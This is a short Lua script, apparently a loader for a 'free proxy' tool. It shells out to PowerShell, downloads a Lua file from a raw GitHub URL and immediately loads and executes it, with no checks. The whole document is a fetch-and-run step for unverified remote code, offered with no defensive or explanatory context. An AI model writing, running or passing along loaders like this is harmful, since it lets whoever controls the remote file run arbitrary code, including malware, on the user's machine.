local handle = io.popen('powershell -Command "(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/ihkaz/gtfybrok/refs/heads/main/FREEGTFYPROXY.lua\')"' )
local script = handle and handle:read("*a") or nil
if handle then handle:close() end
if script then local f = load(script) if f then f() end end